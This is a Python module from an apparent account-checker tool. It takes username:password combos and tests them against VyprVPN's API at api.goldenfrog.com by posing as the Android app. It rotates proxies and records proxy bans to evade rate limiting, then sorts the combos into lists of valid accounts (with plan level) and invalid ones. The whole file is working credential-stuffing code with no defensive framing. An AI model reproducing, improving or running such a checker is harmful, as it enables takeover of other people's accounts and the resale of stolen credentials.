import requests
import json
import re
from utils.values import settings, accounts, Proxies
from utils.utilities import proxy_getter

proxy_ban = r"The requested URL /settings was not found on this server"


def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    header = {
        'User-Agent': "okhttp/3.8.1",
        'contentType': "application/json",
        'X-API-Version': "2",
        'X-API-Features': "partial_sign_up;",
        'X-GF-PRODUCT': "VyprVPN",
        'X-GF-PRODUCT-VERSION': "2.29.0.10068",
        'X-GF-PLATFORM': "Android",
        'X-GF-PLATFORM-VERSION': "7.1.2",
        'locale': "en_UK",
        'X-GF-Agent': "VyprVPN Android v2.29.0.10068. (aceeaa1f)",
        'username': str(username),
        'password': str(password),
        'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        'https': "//www.vyprvpn.com/login:",
        'Accept': "*/*",
        'Cache-Control': "no-cache",
        'Postman-Token': "a3d057d0-2e8c-499c-a53b-ac2b159e9e57,716410f8-2ebd-4ea7-bd80-636dff441b69",
        'Host': "api.goldenfrog.com",
        'accept-encoding': "gzip, deflate",
        'Connection': "keep-alive",
        'cache-control': "no-cache"
    }
    for x in range(0, int(settings.vyprvpn.max_errors_per_try)):
        proxs_list = proxy_getter(__name__)
        try:
            r = requests.get(url="https://api.goldenfrog.com/settings", headers=header, timeout=float(settings.vyprvpn.timeout), proxies=proxs_list[1])

            if re.findall(pattern=proxy_ban, string=r.text):
                # checks if the proxy is banned and marks it as banned if so
                Proxies.checked_json[proxs_list[0]]["bans"]["vyprvpn"] = True
                continue
            if r.status_code == 403:
                # invalid username or password
                break
            if r.status_code == 200:
                r_json = r.json()
                if r_json.get("vpn"):
                    if r_json.get("vpn").get("account_level"):
                        account_type = r_json.get("vpn").get("account_level")
                        accounts.valid_vyprvpn.append(f"{username}:{password}:{account_type}")
                        return
                else:
                    #exits the check if the account never had a vpn plan
                    break
        except:
            pass
    accounts.invalid_vyprvpn.append(f"{username}:{password}")

